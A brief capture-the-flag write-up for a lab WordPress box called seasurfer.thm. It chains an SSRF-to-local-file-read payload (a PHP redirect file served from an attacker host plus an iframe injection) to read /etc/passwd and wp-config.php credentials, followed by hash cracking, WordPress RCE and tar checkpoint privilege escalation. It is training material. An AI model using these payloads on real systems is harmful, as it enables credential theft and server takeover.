ssrf->lfi
22,80 open, checking headers show domain name, seasurfer.thm which is a wordpress site
checking blogs and comments we see a subdomain internal.seasurfer.thm 
which is vulnerable to a lot of stuff including ssrf, we can't read files directly with
<iframe src=file:///etc/passwd> but we can do ssrf which leads to an internal request which can
read files, so setup:

we create a file called file.php with the contents: <?php header('location:file://'.$_REQUEST['url']); ?>
we serve this file on a php server with: `php -S 0.0.0.0:80`

we make the ssrf which requests this file which in turn requests the in internal file we want to read so
in the internal.seasurfer.thm param inputs we use:
<iframe src="http://10.17.17.11/file.php?url=/etc/passwd"> which reads the file and prints it in the pdf.

we read the wordpress conf file under `/var/www/wordpress/wp-config.php` which gives us db creds.

enuming the base seasurfer site shows us `/adminer` which gives database access with creds from the wp-config file.
we read the user hash, crack it locally to get the wordpress user kyle password `jenny4ever` and do wordpress rce to 
get a shell.

for user, there's a cron running which uses tar so it's a standard tar checkpoint privesc to user.

